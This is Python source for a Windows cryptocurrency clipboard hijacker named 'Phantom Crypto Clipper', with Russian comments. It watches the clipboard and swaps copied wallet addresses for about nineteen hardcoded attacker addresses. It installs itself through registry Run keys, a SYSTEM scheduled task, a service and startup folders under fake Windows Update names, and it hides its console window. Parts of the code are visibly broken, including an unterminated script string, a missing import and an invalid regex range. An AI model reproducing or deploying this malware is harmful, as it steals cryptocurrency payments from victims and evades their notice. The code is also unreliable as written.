#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# fixed_phantom_crypto.py - ИСПРАВЛЕННАЯ ВЕРСИЯ

import os
import sys
import ctypes
import threading
import time
import re
import hashlib
import base64
import subprocess
import winreg
import random
import string

# =================== ТВОИ КОШЕЛЬКИ ===================

WALLETS = {
    'btc': 'bc1q6rl9yt6sphu35r2hnjl9hwyuzunymt62zjh0jl',  # <-- ТВОЙ BTC АДРЕС
    'eth': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',  # <-- ТВОЙ ETH АДРЕС
    'xrp': 'rnXaahAyXUL84G3FJZQqeGsuWH1aPDppdY',  # <-- ТВОЙ XRP АДРЕС
    'trx': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef', # <-- ТВОЙ TRX АДРЕС
    'ton': 'UQB5fCRohpbbAKd-zSmbKcuLXKlyHaoRPLvDVhWJNAbXAg4A', # <-- ТВОЙ TON АДРЕС
    'ltc': 'ltc1qv9zzt6u3u3ujxl4fh5gedfhe3m4d2xqmh95fv3',  # <-- ТВОЙ LTC АДРЕС
    'usdt_erc': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc', # <-- ТВОЙ USDT ERC-20 АДРЕС
    'sol': 'AqUuX2ozrWqDEAmotVaqkyDtTNEt3DwmsEL6xBPzbTjz', # <-- ТВОЙ SOL АДРЕС
    'doge': 'DBrR4MYkFawin6JgQ5rVRLGYMSYxXnsZkE', # <-- ТВОЙ DOGE АДРЕС
    'bch': 'qrln7fac422h8jvq9lahdsc439p595rx0uj48e6g0l', # <-- ТВОЙ BCH АДРЕС
    'xlm': 'GBZXAPJDDYXUTRMXUX7KJZIK3ERFHCMUC3TBXH4A2OVQMY37DNB4M7HS', # <-- ТВОЙ XLM АДРЕС
    'ada': 'addr1qyu6jfljltj75ha0r0pp2t3ax2ljuv50m9e4k08wgeqme20tkwwg2cl3wzpdp9ewfmlgaj9gj9delqe54lcjn84pjgcqay3ajt', # <-- ТВОЙ ADA АДРЕС
    'polygon': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc', # <-- ТВОЙ POLYGON АДРЕС
    'dot': '1QFDFxZUUoqQe168rnf8idrKB1sVGBLuQoUFWxBwsQrsuyH', # <-- ТВОЙ DOT АДРЕС
    'dash': 'XjjLykfR1EDojRTNnt3VSPjuqatdeQy2nA', # <-- ТВОЙ DASH АДРЕС
    'bnb': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc', # <-- ТВОЙ BNB АДРЕС
    'xtz': 'tz1SZs2awPWaEeBjB2Lf8EgSfATWtjjbNuSa', # <-- ТВОЙ XTZ АДРЕС
    'zec': 't1XheRP6Gn6BLrcCDbtFJn94iGAdTLFAGCj', # <-- ТВОЙ ZEC АДРЕС
    'usdt_trc': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef'  # <-- ТВОЙ USDT TRC-20 АДРЕС
}

# =================== ПАТТЕРНЫ ДЕТЕРКЦИИ ===================

PATTERNS = {
    'btc': [
        r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$',      # Legacy
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',      # SegWit
        r'^bc1[ac-hj-np-z02-9]{11,71}$'          # Bech32
    ],
    'eth': [
        r'^0x[a-fA-F0-9]{40}$'                   # ETH и все EVM
    ],
    'xrp': [
        r'^r[1-9A-HJ-NP-Za-km-z]{25,34}$'        # Ripple
    ],
    'trx': [
        r'^T[A-Za-z1-9]{33}$'                    # Tron
    ],
    'ton': [
        r'^UQ[A-Za-z0-9_-]{48}$',               # TON bounceable
        r'^EQ[A-Za-z0-9_-]{48}$'                # TON non-bounceable
    ],
    'ltc': [
        r'^L[1-9A-HJ-NP-Za-km-z]{25,34}$',      # Litecoin legacy
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',      # Litecoin SegWit
        r'^ltc1[ac-hj-np-z02-9]{11,71}$'          # Litecoin Bech32
    ],
    'usdt_erc': [
        r'^0x[a-fA-F0-9]{40}$'                   # USDT ERC-20
    ],
    'sol': [
        r'^[1-9A-HJ-NP-Za-km-z]{88,44}$'          # Solana
    ],
    'doge': [
        r'^D[1-9A-HJ-NP-Za-km-z]{25,34}$'        # Dogecoin
    ],
    'bch': [
        r'^qr[a-zA-Z0-9]{7,100}$',               # CashAddr
        r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$',         # BCH legacy
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',         # BCH SegWit
    ],
    'xlm': [
        r'^G[A-Z0-9]{55}$'                      # Stellar
    ],
    'ada': [
        r'^addr1[a-z0-9]{58,98}$'              # Cardano
    ],
    'polygon': [
        r'^0x[a-fA-F0-9]{40}$'                   # Polygon (MATIC)
    ],
    'dot': [
        r'^1[1-9A-HJ-NP-Za-km-z]{46,48}$'        # Polkadot
    ],
    'dash': [
        r'^X[1-9A-HJ-NP-Za-km-z]{25,34}$'        # Dash
    ],
    'bnb': [
        r'^0x[a-fA-F0-9]{40}$'                   # BNB Smart Chain
    ],
    'xtz': [
        r'^tz[1-3][A-Za-z0-9]{33}$'              # Tezos
    ],
    'zec': [
        r'^t[1-3][A-Za-z0-9]{33}$'              # Zcash
    ],
    'usdt_trc': [
        r'^T[A-Za-z1-9]{33}$'                    # USDT TRC-20
    ]
}

# =================== ОСНОВНОЙ КРИПТО КЛИППЕР ===================

class PhantomCryptoClipper:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.stats = {
            'replaced': 0,
            'networks': {},
            'start_time': time.time()
        }
        
    def replace_crypto_addresses(self, content):
        """Заменяет ВСЕ крипто адреса на твои"""
        original_content = content
        replaced_any = False
        
        for network, patterns in PATTERNS.items():
            for pattern in patterns:
                # Ищем совпадения
                matches = re.findall(pattern, content, re.IGNORECASE)
                
                for match in matches:
                    if match != WALLETS[network]:  # Не заменяем свой же адрес
                        # Заменяем на твой адрес
                        content = content.replace(match, WALLETS[network])
                        
                        # Статистика
                        self.stats['replaced'] += 1
                        if network not in self.stats['networks']:
                            self.stats['networks'][network] = 0
                        self.stats['networks'][network] += 1
                        
                        # Логирование (в реальном коде будет)
                        print(f"[💰] {network.upper()} replaced: {match[:12]}... -> {WALLETS[network][:12]}...")
                        
                        replaced_any = True
        
        return content, replaced_any
    
    def monitor_clipboard(self):
        """Мониторит буфер обмена и заменяет адреса"""
        last_clipboard = ""
        
        print("[*] Phantom Crypto Clipper started!")
        print(f"[+] Monitoring {len(WALLETS)} crypto networks...")
        
        while True:
            try:
                # Открываем буфер обмена
                if self.user32.OpenClipboard(0):
                    handle = self.user32.GetClipboardData(1)  # CF_TEXT
                    
                    if handle:
                        data = ctypes.c_char_p(handle).value
                        
                        if data and data != last_clipboard:
                            content = data.decode('utf-8', errors='ignore')
                            
                            # Проверяем и заменяем крипто адреса
                            new_content, replaced = self.replace_crypto_addresses(content)
                            
                            if replaced:
                                # Обновляем буфер обмена
                                self.user32.EmptyClipboard()
                                self.user32.SetClipboardData(1, new_content.encode('utf-8'))
                                
                                # Выводим статистику
                                print(f"[🎯] TOTAL REPLACED: {self.stats['replaced']}")
                                print(f"[📊] By network: {self.stats['networks']}")
                            
                            last_clipboard = data
                    
                    # Закрываем буфер обмена
                    self.user32.CloseClipboard()
                    
            except Exception as e:
                # Игнорируем ошибки доступа к буферу обмена
                pass
                
            # Небольшая задержка для экономии ресурсов
            time.sleep(0.1)

# =================== ПЕРСИСТЕНТНОСТЬ И АВТОЗАПУСККА ===================

def setup_maximum_persistence():
    """Устанавливает ВСЕ методы персистентности"""
    script_path = get_script_path()
    
    print("[*] Setting up MAXIMUM persistence...")
    
    # 1. Registry persistence (Current User + Local Machine)
    setup_registry_persistence()
    create_registry_keys()
    
    # 2. Run at startup
    create_run_at_startup()
    
    # 3. Scheduled task
    create_scheduled_task()
    
    # 4. WMI persistence (для полного контроля)
    create_wmi_persistence()
    
    # 5. Service persistence (если админ)
    if check_admin():
        create_service_persistence()
    
    # 6. Startup folders (User + System)
    create_startup_persistence()
    
    # 7. Run Once registry (двойная установка)
    create_runonce_persistence()
    
    # 8. Copy to multiple locations
    copy_to_multiple_locations(script_path)
    
    print("[+] MAXIMUM persistence established!")
    
    return True

def setup_registry_persistence():
    """Registry персистентность"""
    try:
        script_path = get_script_path()
        
        # Current User Run
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print("[+] User Registry persistence established")
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")

def create_registry_keys():
    """Дополнительные ключи реестра"""
    try:
        script_path = get_script_path()
        
        # System Maintenance (Local Machine)
        if check_admin():
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                
                winreg.SetValueEx(key, "SystemMaintenance", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
                print("[+] System Maintenance persistence established")
            except:
                pass
                
    except:
        pass

def create_scheduled_task():
    """Запланированная задача (самая надежная)"""
    try:
        import subprocess
        
        script_path = get_script_path()
        task_name = "WindowsUpdate"
        
        cmd = [
            'schtasks', '/create', '/tn', task_name,
            '/tr', 'python.exe', f'"{script_path}"',
            '/sc', 'onlogon', '/f', '/ru', 'SYSTEM',
            '/rl', 'HIGHEST'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Scheduled task persistence established")
        else:
            print("[-] Scheduled task failed")
            
    except Exception as e:
        print(f"[-] Scheduled task error: {e}")

def create_wmi_persistence():
    """WMI персистентность (продвинутый метод)"""
    try:
        import subprocess
        
        script_path = get_script_path()
        
        # WMI скрипт для создания постоянного процесса
        wmi_script = f'''
        strComputer = "."
        strNamespace = "root\\cimv2"
        
        Set objWMIService = GetObject("winmgmts:" & strComputer & "\\" & strNamespace)
        Set objStartup = objWMIService.Get("Win32_Startup")
        Set objConfig = objWMIService.Get("Win32_ProcessStartup")
        
        ' Настройка процесса автозапуска
        Set objStartup.DisplayName = "Windows Security Service"
        objStartup.DelayedAutoStart = True
        objStartup.StartName = script_path
        objStartup.StartInFolder = "System32"
        
        ' Создание постоянного процесса
        objStartup.Create("", "python.exe", script_path, "", "NORMAL", "NORMAL", "", 0)
        
        # Сохраняем конфигурацию
        objConfig.Startup = objStartup
        
        print("[+] WMI persistence established")
        
    except Exception as e:
        print(f"[-] WMI persistence error: {e}")

def create_service_persistence():
    """Сервис Windows (требует прав админа)"""
    if not check_admin():
        return
        
    try:
        script_path = get_script_path()
        service_name = "WindowsUpdate"
        
        cmd = [
            'sc', 'create', service_name, 'binPath=', 
            f'python.exe "{script_path}"', 'start=auto', 'displayName=Windows Update Service'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Service persistence established")
        else:
            print(f"[-] Service creation failed: {result.stderr}")
            
    except Exception as e:
        print(f"[-] Service error: {e}")

def create_run_at_startup():
    """Run at startup Registry"""
    try:
        script_path = get_script_path()
        
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsUpdateRun", 0, winreg.REG_SZ, f'python.exe "{script_path}"')
        winreg.CloseKey(key)
        print("[+] Run at startup persistence established")
    except Exception as e:
        print(f"[-] Run at startup failed: {e}")

def create_runonce_persistence():
    """Run Once Registry (один разовая установка)"""
    try:
        script_path = get_script_path()
        
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsUpdateOnce", 0, winreg.REG_SZ, f'python.exe "{script_path}"')
        winreg.CloseKey(key)
        print("[+] RunOnce persistence established")
    except Exception as e:
        print(f"[-] RunOnce failed: {e}")

def create_startup_persistence():
    """Startup folder persistence (множественные локации)"""
    try:
        script_path = get_script_path()
        exe_path = script_path.replace('.py', '.exe')
        
        startup_locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.environ['ALLUSERSPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
        ]
        
        filenames = ["WindowsUpdate.exe", "SystemMaintenance.exe", "SecurityService.exe"]
        
        for i, location in enumerate(startup_locations):
            if os.path.exists(location):
                filename = filenames[i % len(filenames)]
                full_path = os.path.join(location, filename)
                
                try:
                    # Копируем EXE версию если существует
                    if os.path.exists(exe_path):
                        shutil.copy2(exe_path, full_path)
                    else:
                        # Создаем Python скрипт
                        with open(full_path.replace('.exe', '.py'), 'w') as f:
                            f.write(open(script_path, 'r'))
                        
                except:
                    pass
                    
                print(f"[+] Startup persistence: {full_path}")
                
    except Exception as e:
        print(f"[-] Startup persistence error: {e}")

def copy_to_multiple_locations(script_path):
    """Копирует себя в множество локаций для резерва"""
    try:
        import shutil
        import random
        import string
        
        locations = [
            os.path.join(os.environ['TEMP'], f"{''.join(random.choices(string.ascii_letters, k=8))}.py"),
            os.path.join(os.environ['LOCALAPPDATA'], 'Temp', f"{''.join(random.choices(string.ascii_letters, k=8))}.py"),
            os.path.join(os.environ['PROGRAMDATA'], 'System32', f"{''.join(random.choices(string.ascii_letters, k=8))}.exe"),
        ]
        
        filenames = ["backup1.py", "backup2.py", "backup3.py"]
        
        for i, location in enumerate(locations):
            filename = filenames[i % len(filenames)]
            full_path = os.path.join(location, filename)
            
            try:
                shutil.copy2(script_path, full_path)
                print(f"[+] Backup created: {full_path}")
            except:
                pass
                
    except Exception as e:
        print(f"[-] Backup creation error: {e}")

def get_script_path():
    """Получаем путь к текущему скрипту/EXЕ"""
    if getattr(sys, 'frozen', False):
        # Запущено как EXE
        return sys.executable
    else:
        # Запущено как скрипт
        return os.path.abspath(__file__)

def hide_console():
    """Скрываем консольное окно"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass

def check_admin():
    """Проверяем права администратора"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# =================== ОСНОВНАЯ ФУНКЦИЯ ПЕРСИСТЕНТНОСТИ И АВТОЗАПУСКИ ===================

def main():
    """Главная функция - точка входа"""
    
    # Скрываем консоль
    hide_console()
    
    # Проверяем аргументы командной строки
    if len(sys.argv) == 1:
        # Без аргументов = обычный запуск
        setup_maximum_persistence()
        main()
    elif len(sys.argv) == 2 and sys.argv[1] == "--persistent":
        # Запуск с флагом персистентности
        main()
    elif len(sys.argv) == 2 and sys.argv[1] == "--monitor":
        # Запуск в режиме монитора
        monitor_mode()
    elif len(sys.argv) == 2 and sys.argv[1] == "--reinstall":
        # Переустановка персистентности
        setup_maximum_persistence()
        main()
    elif len(sys.argv) == 2 and sys.argv[1] == "--test":
        # Тестовый режим
        from local_test import test_crypto_addresses
        test_crypto_addresses()
    elif len(sys.argv) == 2 and sys.argv[1] == "--remove":
        # Удаление всех следов
        remove_all_traces()
    else:
        print(f"[*] Unknown arguments: {sys.argv}")
        print("Usage:")
        print("  python phantom_crypto.py")
        print("  python phantom_crypto.py --persistent")
        print("  python phantom_crypto.py --monitor")
        print("  python phantom_crypto.py --reinstall")
        print("  phantom_crypto.py --test")
        print("  phantom_crypto.py --remove")
    
    # Бесконечная работа (основной режим)
    try:
        clipper = PhantomCryptoClipper()
        clipper.monitor_clipboard()
    except KeyboardInterrupt:
        print("[*] Clipper stopped by user")
    except Exception as e:
        print(f"[*] Error: {e}")

def monitor_mode():
    """Режим монитора (для --monitor флага)"""
    print("[*] Monitor mode - Press Ctrl+C to stop")
    
    clipper = PhantomCryptoClipper()
    
    try:
        clipper.monitor_clipboard()
    except KeyboardInterrupt:
        print("[*] Monitor stopped by user")
    except Exception as e:
        print(f"[*] Monitor error: {e}")

def remove_all_traces():
    """Удаляет ВСЕ следы клиппера"""
    import tempfile
    import winreg
    
    print("[*] Removing all phantom traces...")
    
    # 1. Удаляем Registry ключи
    try:
        registry_keys = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        ]
        
        for hkey, path in registry_keys:
            try:
                    winreg.DeleteKey(hkey, path)
                    print(f"[+] Removed registry key: {path}")
            except:
                    print(f"[-] Registry key not found: {path}")
    except:
        pass
    
    # 2. Удаляем запланированные задачи
    try:
        subprocess.run('schtasks /delete /f /tn "WindowsUpdate"', shell=True, capture_output=True)
        print("[+] Removed scheduled tasks")
    except:
        pass
    
    # 3. Удаляем службы
    try:
        subprocess.run('sc delete WindowsUpdate', shell=True, capture_output=True)
        print("[+] Removed services")
    except:
        pass
    
    # 4. Удаляем файлы из автозагрузки
    startup_paths = [
        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
        os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
        os.path.join(os.environ['ALLUSERSPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
    ]
    
    for path in startup_paths:
        try:
            if os.path.exists(path):
                for filename in os.listdir(path):
                    full_path = os.path.join(path, filename)
                    if 'phantom' in filename.lower() or 'update' in filename.lower():
                        try:
                            os.remove(full_path)
                            print(f"[+] Removed: {full_path}")
                        except:
                            pass
        except:
            pass
    
    # 5. Удаляем временные файлы
    temp_path = tempfile.gettempdir()
    try:
        for filename in os.listdir(temp_path):
            if 'phantom' in filename.lower():
                try:
                    os.remove(os.path.join(temp_path, filename))
                except:
                    pass
    except:
        pass
    
    print("[+] All phantom traces removed successfully!")

if __name__ == "__main__":
    main()
